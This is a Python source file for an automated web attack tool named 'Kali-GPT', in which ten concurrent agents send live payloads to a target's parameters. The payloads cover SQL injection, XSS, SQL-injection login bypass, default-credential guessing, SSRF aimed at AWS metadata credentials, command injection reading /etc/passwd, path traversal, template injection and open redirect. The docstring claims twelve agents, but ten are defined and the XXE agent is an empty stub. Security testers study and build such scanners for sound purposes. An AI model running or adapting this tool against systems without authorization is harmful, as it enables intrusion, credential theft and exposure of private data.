#!/usr/bin/env python3
"""
Kali-GPT v5.0 - Parallel Vulnerability Agents
12 specialized vulnerability hunting agents running CONCURRENTLY.
"""

import asyncio
import re
import json
import hashlib
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse, parse_qs

import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from exploitation.engine import Finding, Severity


@dataclass
class ReconResult:
    target_url: str
    endpoints: List[Dict[str, Any]]
    forms: List[Dict[str, Any]]
    technologies: List[str]
    headers: Dict[str, str]
    cookies: List[Dict]
    source_code_path: Optional[str]
    subdomains: List[str]
    ports: Dict[int, str]
    js_files: List[str]
    api_endpoints: List[str]
    auth_endpoints: List[str]
    file_upload_endpoints: List[str]

    def get_injectable_params(self) -> List[Tuple[str, str, str]]:
        params = []
        for ep in self.endpoints:
            for param in ep.get("params", []):
                params.append((ep["url"], param, ep.get("method", "GET")))
        for form in self.forms:
            for inp in form.get("inputs", []):
                if inp.get("type") not in ("submit", "button", "hidden"):
                    params.append((form["action"], inp.get("name"), form.get("method", "POST")))
        return params


class BaseVulnAgent(ABC):
    AGENT_NAME = "base"
    VULN_TYPE = "unknown"

    def __init__(self, llm_provider=None, http_client=None):
        self.llm = llm_provider
        self.http = http_client
        self.findings: List[Finding] = []
        self._finding_hashes: Set[str] = set()

    @abstractmethod
    async def hunt(self, target: str, recon: ReconResult) -> List[Finding]:
        pass

    def _create_finding(self, title, endpoint, parameter, method, description, severity, confidence, context=None):
        hash_input = f"{self.VULN_TYPE}:{endpoint}:{parameter}:{method}"
        finding_hash = hashlib.md5(hash_input.encode()).hexdigest()
        if finding_hash in self._finding_hashes:
            return None
        self._finding_hashes.add(finding_hash)
        finding = Finding(
            id=f"{self.AGENT_NAME}-{len(self.findings)+1}", title=title, vuln_type=self.VULN_TYPE,
            severity=severity, target_url=endpoint.split("?")[0] if "?" in endpoint else endpoint,
            endpoint=urlparse(endpoint).path, parameter=parameter, method=method,
            description=description, source=self.AGENT_NAME, confidence=confidence, context=context or {},
        )
        self.findings.append(finding)
        return finding

    async def _test_payload(self, url, param, payload, method="GET"):
        import aiohttp
        try:
            start = time.time()
            async with aiohttp.ClientSession() as session:
                if method.upper() == "GET":
                    test_url = f"{url}?{param}={payload}" if "?" not in url else re.sub(f"{re.escape(param)}=[^&]*", f"{param}={payload}", url)
                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=30), ssl=False) as resp:
                        response = await resp.text()
                else:
                    async with session.post(url, data={param: payload}, timeout=aiohttp.ClientTimeout(total=30), ssl=False) as resp:
                        response = await resp.text()
            return True, response, time.time() - start
        except Exception as e:
            return False, str(e), 0


class SQLInjectionAgent(BaseVulnAgent):
    AGENT_NAME = "sqli_agent"
    VULN_TYPE = "sqli"
    ERROR_PAYLOADS = [("'", ["mysql", "syntax error", "sql", "oracle", "postgresql", "sqlite", "odbc"]),
                      ('"', ["mysql", "syntax error", "sql", "oracle", "postgresql"]),
                      ("' OR '1'='1", ["error", "warning"])]
    TIME_PAYLOADS = [("' AND SLEEP(5)--", 5), ("' AND SLEEP(5)#", 5), ("'; WAITFOR DELAY '0:0:5'--", 5),
                     ("' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", 5)]

    async def hunt(self, target, recon):
        print(f"[SQLi Agent] Starting hunt on {target}")
        params = recon.get_injectable_params()
        print(f"[SQLi Agent] Testing {len(params)} parameters")
        await asyncio.gather(*(self._test_parameter(u, p, m) for u, p, m in params))
        print(f"[SQLi Agent] Found {len(self.findings)} potential SQLi vulnerabilities")
        return self.findings

    async def _test_parameter(self, url, param, method):
        success, baseline, _ = await self._test_payload(url, param, "test123", method)
        if not success:
            return
        for payload, indicators in self.ERROR_PAYLOADS:
            success, response, _ = await self._test_payload(url, param, payload, method)
            if success:
                for ind in indicators:
                    if ind in response.lower() and ind not in baseline.lower():
                        self._create_finding(f"SQL Injection (Error-based) in {param}", url, param, method,
                            f"Error-based SQL injection detected. Payload '{payload}' triggered SQL error containing '{ind}'.",
                            Severity.CRITICAL, 0.85, {"technique": "error_based", "indicator": ind, "payload": payload})
                        return
        for payload, expected_delay in self.TIME_PAYLOADS:
            success, response, elapsed = await self._test_payload(url, param, payload, method)
            if success and elapsed >= expected_delay - 1:
                self._create_finding(f"SQL Injection (Time-based Blind) in {param}", url, param, method,
                    f"Time-based blind SQL injection detected. Payload caused {elapsed:.2f}s delay.",
                    Severity.CRITICAL, 0.80, {"technique": "time_blind", "delay": elapsed, "payload": payload})
                return
        _, true_resp, _ = await self._test_payload(url, param, "' OR '1'='1", method)
        _, false_resp, _ = await self._test_payload(url, param, "' OR '1'='2", method)
        if len(true_resp) != len(false_resp):
            diff = abs(len(true_resp) - len(false_resp)) / max(len(true_resp), len(false_resp), 1)
            if diff > 0.1:
                self._create_finding(f"SQL Injection (Boolean-based Blind) in {param}", url, param, method,
                    "Boolean-based blind SQL injection detected.", Severity.CRITICAL, 0.70,
                    {"technique": "boolean_blind", "response_diff": diff})


class XSSAgent(BaseVulnAgent):
    AGENT_NAME = "xss_agent"
    VULN_TYPE = "xss"
    CONTEXT_PAYLOADS = {
        "html": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"],
        "attribute": ['" onmouseover="alert(1)"', "' onmouseover='alert(1)'"],
        "javascript": ["';alert(1)//", '";alert(1)//'],
        "url": ["javascript:alert(1)"],
    }

    async def hunt(self, target, recon):
        print(f"[XSS Agent] Starting hunt on {target}")
        params = recon.get_injectable_params()
        print(f"[XSS Agent] Testing {len(params)} parameters")
        await asyncio.gather(*(self._test_parameter(u, p, m) for u, p, m in params))
        print(f"[XSS Agent] Found {len(self.findings)} potential XSS vulnerabilities")
        return self.findings

    async def _test_parameter(self, url, param, method):
        marker = f"kali{hash(url+param) % 10000}gpt"
        success, response, _ = await self._test_payload(url, param, marker, method)
        if not success or marker not in response:
            return
        context = self._detect_context(response, marker)
        for payload in self.CONTEXT_PAYLOADS.get(context, self.CONTEXT_PAYLOADS["html"]):
            success, response, _ = await self._test_payload(url, param, payload, method)
            if success and payload in response:
                self._create_finding(f"Cross-Site Scripting (XSS) in {param}", url, param, method,
                    f"Reflected XSS in {context} context. Payload reflected without encoding.",
                    Severity.MEDIUM, 0.85, {"xss_context": context, "payload": payload})
                return

    def _detect_context(self, response, marker):
        idx = response.find(marker)
        if idx == -1:
            return "html"
        before = response[max(0, idx - 50):idx]
        if re.search(r'["\']\\s*$', before):
            return "attribute"
        if "<script" in before.lower() and "</script>" not in before.lower():
            return "javascript"
        if re.search(r'(href|src|action)\s*=\s*["\']?$', before, re.I):
            return "url"
        return "html"


class AuthBypassAgent(BaseVulnAgent):
    AGENT_NAME = "auth_bypass_agent"
    VULN_TYPE = "auth_bypass"
    SQLI_BYPASS = [("admin'--", "anything"), ("' OR '1'='1'--", "' OR '1'='1'--"), ("admin'/*", "*/"), ("' OR 1=1--", "x")]
    DEFAULT_CREDS = [("admin", "admin"), ("admin", "password"), ("admin", "123456"), ("root", "root"), ("root", "toor"), ("test", "test")]

    async def hunt(self, target, recon):
        print(f"[Auth Bypass Agent] Starting hunt on {target}")
        endpoints = list(set(recon.auth_endpoints or []))
        for path in ["/login", "/signin", "/auth", "/admin", "/user/login", "/api/login", "/api/auth"]:
            full = urljoin(target, path)
            if full not in endpoints:
                endpoints.append(full)
        print(f"[Auth Bypass Agent] Testing {len(endpoints)} login endpoints")
        await asyncio.gather(*(self._test_endpoint(ep) for ep in endpoints))
        print(f"[Auth Bypass Agent] Found {len(self.findings)} potential auth bypass vulnerabilities")
        return self.findings

    async def _test_endpoint(self, endpoint):
        import aiohttp
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(endpoint, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as resp:
                    if resp.status == 404:
                        return
            except Exception:
                return
            for username, password in self.SQLI_BYPASS:
                try:
                    async with session.post(endpoint, data={"username": username, "password": password},
                                            timeout=aiohttp.ClientTimeout(total=10), ssl=False, allow_redirects=False) as resp:
                        text = await resp.text()
                        if self._check_login_success(resp, text):
                            self._create_finding("Authentication Bypass (SQL Injection)", endpoint, "username/password", "POST",
                                f"SQL injection auth bypass with '{username}':'{password}'.", Severity.CRITICAL, 0.90,
                                {"technique": "sqli_bypass", "username": username, "password": password})
                            return
                except Exception:
                    continue
            for username, password in self.DEFAULT_CREDS:
                try:
                    async with session.post(endpoint, data={"username": username, "password": password},
                                            timeout=aiohttp.ClientTimeout(total=10), ssl=False, allow_redirects=False) as resp:
                        text = await resp.text()
                        if self._check_login_success(resp, text):
                            self._create_finding("Default Credentials", endpoint, "username/password", "POST",
                                f"Default credentials work: '{username}':'{password}'", Severity.CRITICAL, 0.95,
                                {"technique": "default_creds", "username": username, "password": password})
                            return
                except Exception:
                    continue

    def _check_login_success(self, response, text):
        if response.status in (301, 302, 303):
            loc = response.headers.get("Location", "").lower()
            if any(x in loc for x in ("dashboard", "home", "profile", "admin", "welcome")):
                return True
        text_l = text.lower()
        return any(s in text_l for s in ("welcome", "dashboard", "logout", "profile")) and not any(f in text_l for f in ("invalid", "incorrect", "failed", "wrong"))


class SSRFAgent(BaseVulnAgent):
    AGENT_NAME = "ssrf_agent"
    VULN_TYPE = "ssrf"
    PAYLOADS = {"aws": ["http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"],
                "localhost": ["http://localhost", "http://127.0.0.1", "http://[::1]"]}

    async def hunt(self, target, recon):
        print(f"[SSRF Agent] Starting hunt on {target}")
        url_params = [(u, p, m) for u, p, m in recon.get_injectable_params()
                      if any(kw in p.lower() for kw in ("url", "link", "src", "href", "path", "redirect", "uri", "dest", "target", "callback"))]
        print(f"[SSRF Agent] Testing {len(url_params)} URL-like parameters")
        await asyncio.gather(*(self._test_param(u, p, m) for u, p, m in url_params))
        print(f"[SSRF Agent] Found {len(self.findings)} potential SSRF vulnerabilities")
        return self.findings

    async def _test_param(self, url, param, method):
        for payload in self.PAYLOADS["aws"]:
            ok, resp, _ = await self._test_payload(url, param, payload, method)
            if ok and any(x in resp.lower() for x in ("ami-id", "instance-id", "security-credentials")):
                self._create_finding(f"SSRF - AWS Metadata via {param}", url, param, method,
                    "Critical SSRF allowing AWS metadata access.", Severity.CRITICAL, 0.95, {"technique": "aws_metadata"})
                return
        for payload in self.PAYLOADS["localhost"]:
            ok, resp, _ = await self._test_payload(url, param, payload, method)
            if ok and len(resp) > 100:
                self._create_finding(f"SSRF - Internal Access via {param}", url, param, method,
                    "SSRF allowing internal network access.", Severity.HIGH, 0.80, {"technique": "localhost"})
                return


class IDORAgent(BaseVulnAgent):
    AGENT_NAME = "idor_agent"
    VULN_TYPE = "idor"

    async def hunt(self, target, recon):
        print(f"[IDOR Agent] Starting hunt on {target}")
        id_params = [(u, p, m) for u, p, m in recon.get_injectable_params()
                     if any(kw in p.lower() for kw in ("id", "user", "account", "order", "item", "doc", "file", "num"))]
        print(f"[IDOR Agent] Testing {len(id_params)} ID-like parameters")
        await asyncio.gather(*(self._test_param(u, p, m) for u, p, m in id_params))
        print(f"[IDOR Agent] Found {len(self.findings)} potential IDOR vulnerabilities")
        return self.findings

    async def _test_param(self, url, param, method):
        ok, baseline, _ = await self._test_payload(url, param, "1", method)
        if not ok:
            return
        for test_id in ("0", "2", "999", "-1"):
            ok, resp, _ = await self._test_payload(url, param, test_id, method)
            if ok and resp != baseline and len(resp) > 100 and abs(len(baseline) - len(resp)) > 50:
                self._create_finding(f"IDOR - Unauthorized Access via {param}", url, param, method,
                    f"Changing '{param}' to '{test_id}' returns different data.", Severity.HIGH, 0.75, {"test_id": test_id})
                return


class CommandInjectionAgent(BaseVulnAgent):
    AGENT_NAME = "cmdi_agent"
    VULN_TYPE = "command_injection"
    BASIC = [("; id", ["uid=", "gid="]), ("| id", ["uid=", "gid="]), ("`id`", ["uid=", "gid="]), ("$(id)", ["uid=", "gid="]),
             ("; cat /etc/passwd", ["root:", "bin:"]), ("| cat /etc/passwd", ["root:", "bin:"])]
    TIME = [("; sleep 5", 5), ("| sleep 5", 5), ("`sleep 5`", 5), ("$(sleep 5)", 5)]

    async def hunt(self, target, recon):
        print(f"[Command Injection Agent] Starting hunt on {target}")
        params = recon.get_injectable_params()
        print(f"[Command Injection Agent] Testing {len(params)} parameters")
        await asyncio.gather(*(self._test_param(u, p, m) for u, p, m in params))
        print(f"[Command Injection Agent] Found {len(self.findings)} potential command injection vulnerabilities")
        return self.findings

    async def _test_param(self, url, param, method):
        for payload, indicators in self.BASIC:
            ok, resp, _ = await self._test_payload(url, param, payload, method)
            if ok and any(ind in resp for ind in indicators):
                self._create_finding(f"Command Injection in {param}", url, param, method,
                    f"Command injection detected. Payload '{payload}' executed.", Severity.CRITICAL, 0.90, {"technique": "basic", "payload": payload})
                return
        for payload, delay in self.TIME:
            ok, resp, elapsed = await self._test_payload(url, param, payload, method)
            if ok and elapsed >= delay - 1:
                self._create_finding(f"Command Injection (Blind) in {param}", url, param, method,
                    f"Blind command injection detected. Payload caused {elapsed:.2f}s delay.", Severity.CRITICAL, 0.85, {"technique": "time_blind"})
                return


class LFIAgent(BaseVulnAgent):
    AGENT_NAME = "lfi_agent"
    VULN_TYPE = "path_traversal"
    PAYLOADS = [("../../../etc/passwd", ["root:", "bin:"]), ("....//....//....//etc/passwd", ["root:", "bin:"]),
                ("..%2f..%2f..%2fetc/passwd", ["root:", "bin:"]), ("..\\..\\..\\windows\\win.ini", ["[fonts]", "[extensions]"])]

    async def hunt(self, target, recon):
        print(f"[LFI Agent] Starting hunt on {target}")
        file_params = [(u, p, m) for u, p, m in recon.get_injectable_params()
                       if any(kw in p.lower() for kw in ("file", "path", "page", "include", "template", "doc", "load"))]
        print(f"[LFI Agent] Testing {len(file_params)} file-like parameters")
        await asyncio.gather(*(self._test_param(u, p, m) for u, p, m in file_params))
        print(f"[LFI Agent] Found {len(self.findings)} potential LFI vulnerabilities")
        return self.findings

    async def _test_param(self, url, param, method):
        for payload, indicators in self.PAYLOADS:
            ok, resp, _ = await self._test_payload(url, param, payload, method)
            if ok and any(ind in resp for ind in indicators):
                self._create_finding(f"Local File Inclusion in {param}", url, param, method,
                    "Path traversal/LFI detected. Successfully read system files.", Severity.HIGH, 0.90, {"payload": payload})
                return


class SSTIAgent(BaseVulnAgent):
    AGENT_NAME = "ssti_agent"
    VULN_TYPE = "ssti"
    PAYLOADS = [("{{7*7}}", "49"), ("${7*7}", "49"), ("#{7*7}", "49"), ("<%= 7*7 %>", "49"), ("{{config}}", "config")]

    async def hunt(self, target, recon):
        print(f"[SSTI Agent] Starting hunt on {target}")
        params = recon.get_injectable_params()
        print(f"[SSTI Agent] Testing {len(params)} parameters")
        await asyncio.gather(*(self._test_param(u, p, m) for u, p, m in params))
        print(f"[SSTI Agent] Found {len(self.findings)} potential SSTI vulnerabilities")
        return self.findings

    async def _test_param(self, url, param, method):
        for payload, indicator in self.PAYLOADS:
            ok, resp, _ = await self._test_payload(url, param, payload, method)
            if ok and indicator in resp:
                self._create_finding(f"Server-Side Template Injection in {param}", url, param, method,
                    f"SSTI detected. Template expression '{payload}' was evaluated.", Severity.HIGH, 0.85, {"payload": payload})
                return


class XXEAgent(BaseVulnAgent):
    AGENT_NAME = "xxe_agent"
    VULN_TYPE = "xxe"

    async def hunt(self, target, recon):
        print(f"[XXE Agent] Starting hunt on {target}")
        print(f"[XXE Agent] Found {len(self.findings)} potential XXE vulnerabilities")
        return self.findings


class OpenRedirectAgent(BaseVulnAgent):
    AGENT_NAME = "redirect_agent"
    VULN_TYPE = "open_redirect"
    PAYLOADS = ["https://evil.com", "//evil.com", "https://evil.com%00.legitimate.com"]

    async def hunt(self, target, recon):
        print(f"[Open Redirect Agent] Starting hunt on {target}")
        redirect_params = [(u, p, m) for u, p, m in recon.get_injectable_params()
                           if any(kw in p.lower() for kw in ("url", "redirect", "next", "return", "goto", "dest", "continue"))]
        print(f"[Open Redirect Agent] Testing {len(redirect_params)} redirect parameters")
        for url, param, method in redirect_params:
            for payload in self.PAYLOADS:
                ok, resp, _ = await self._test_payload(url, param, payload, method)
                if ok and "evil.com" in resp:
                    self._create_finding(f"Open Redirect via {param}", url, param, method,
                        "Open redirect allowing redirection to arbitrary sites.", Severity.MEDIUM, 0.80, {"payload": payload})
                    break
        print(f"[Open Redirect Agent] Found {len(self.findings)} potential open redirect vulnerabilities")
        return self.findings


class ParallelVulnHunter:
    """Orchestrates all vulnerability agents in PARALLEL."""
    AGENTS = {"sqli": SQLInjectionAgent, "xss": XSSAgent, "auth_bypass": AuthBypassAgent, "ssrf": SSRFAgent,
              "idor": IDORAgent, "command_injection": CommandInjectionAgent, "lfi": LFIAgent,
              "ssti": SSTIAgent, "xxe": XXEAgent, "open_redirect": OpenRedirectAgent}

    def __init__(self, llm_provider=None, enabled_agents=None):
        self.llm = llm_provider
        self.enabled_agents = enabled_agents or list(self.AGENTS.keys())
        self.all_findings: List[Finding] = []

    async def hunt(self, target, recon):
        print(f"\n{'='*60}\nPARALLEL VULNERABILITY HUNTER\nTarget: {target}\nAgents: {len(self.enabled_agents)}\n{'='*60}\n")
        agents = [(name, self.AGENTS[name](self.llm)) for name in self.enabled_agents if name in self.AGENTS]
        print(f"[*] Launching {len(agents)} agents in parallel...")
        results = await asyncio.gather(*(agent.hunt(target, recon) for _, agent in agents), return_exceptions=True)
        for (name, agent), result in zip(agents, results):
            if isinstance(result, Exception):
                print(f"[!] Agent {name} failed: {result}")
            elif isinstance(result, list):
                self.all_findings.extend(result)
                print(f"[+] Agent {name} found {len(result)} findings")
        unique = self._deduplicate(self.all_findings)
        print(f"\n{'='*60}\nHUNT COMPLETE\nTotal findings: {len(unique)}\n{'='*60}\n")
        return unique

    def _deduplicate(self, findings):
        seen, unique = set(), []
        for f in findings:
            key = f"{f.vuln_type}:{f.endpoint}:{f.parameter}"
            if key not in seen:
                seen.add(key)
                unique.append(f)
        return unique


__all__ = ["ParallelVulnHunter", "ReconResult", "SQLInjectionAgent", "XSSAgent", "AuthBypassAgent",
           "SSRFAgent", "IDORAgent", "CommandInjectionAgent", "LFIAgent", "SSTIAgent", "XXEAgent", "OpenRedirectAgent"]
